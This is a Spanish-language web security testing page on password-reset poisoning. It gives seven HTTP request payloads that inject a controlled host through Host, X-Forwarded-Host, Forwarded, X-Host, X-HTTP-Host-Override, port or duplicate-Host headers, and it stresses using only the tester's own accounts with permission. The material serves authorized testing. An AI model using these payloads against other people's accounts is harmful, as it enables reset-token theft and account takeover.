# 🗡️ Envenenamiento del enlace de recuperación: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Host directo

**Objetivo:** Solicitar reset solo de la cuenta propia con Host controlado.

```http
POST /forgot-password HTTP/1.1
Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Inspeccionar el correo recibido: la prueba relevante es la URL con token, no el texto HTTP inmediato.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning).

### 2. X-Forwarded-Host

**Objetivo:** Conservar Host legítimo y variar el host que el proxy podría entregar al backend.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Confirmar dominio del enlace recibido. No afirmar toma de cuenta si el token no aparece o no es canjeable.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 3. Forwarded host

**Objetivo:** Aislar la cabecera estándar Forwarded en una solicitud propia.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}
Forwarded: host={CONTROLLED_HOST};proto=https
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** El backend puede ignorarla. Registrar si el correo usa exactamente el host aportado.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 4. X-Host

**Objetivo:** Probar una cabecera de override documentada, por separado.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}
X-Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Comparar con el caso base sin X-Host; solo la URL recibida establece influencia real.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 5. X-HTTP-Host-Override

**Objetivo:** Probar otro override en una request separada.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}
X-HTTP-Host-Override: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Evitar envíos repetidos masivos; los correos y tokens de la cuenta propia permiten comparar.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 6. Puerto de Host

**Objetivo:** Comprobar si el validador acepta dominio correcto pero usa un puerto manipulado en el enlace.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}:8443
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** No es fuga si el host sigue siendo legítimo; interesa un parser que valida host y genera una URL distinta.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

### 7. Host duplicado en laboratorio

**Objetivo:** Observar desacuerdo de parsing en un entorno aislado propio.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}
Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Muchos frontends lo rechazan. No enviar a infraestructura compartida sin permiso porque puede afectar enrutamiento.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/host-header/exploiting).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
